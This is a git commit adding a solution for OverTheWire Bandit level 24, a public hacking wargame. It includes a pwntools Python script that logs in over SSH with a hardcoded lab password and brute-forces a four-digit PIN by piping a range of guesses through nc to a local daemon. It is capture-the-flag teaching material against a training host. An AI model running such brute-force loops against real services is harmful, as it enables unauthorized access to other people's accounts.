ff6df6f7a46813d53757839883f2a54f5442fe7f
Mikael Kall <Mikael.Kall@kindredplc.com>
2017-12-16 22:56:47 +0100

    Added level24

---
+++ bandit/level24/README.md
@@ -0,0 +1,5 @@
+# Bandit Level 24 → Level 25
+
+## Level Goal
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
---
+++ bandit/level24/solution.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python2
+from pwn import *
+from pygments import highlight
+from pygments.lexers import CLexer
+from pygments.formatters import TerminalFormatter
+from pwnlib.util.fiddling import randoms
+
+level = 24
+user = 'bandit%s' % level
+next_user = 'bandit%s' % str(level+1)
+host = 'bandit.labs.overthewire.org'
+password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+port = 2220
+
+def connectToLevel():
+    return ssh(user=user, host=host, port=port, password=password)
+
+context(arch='i386', os='linux')
+
+sh = connectToLevel()
+p = sh.process("for pin in {5001..6001}; do echo \"%s $pin\"; done | nc localhost 30002" % ( password ), shell=True)
+flag = p.recvuntil('The password of user bandit25 is')
+log.info('Flag = %s' % flag)
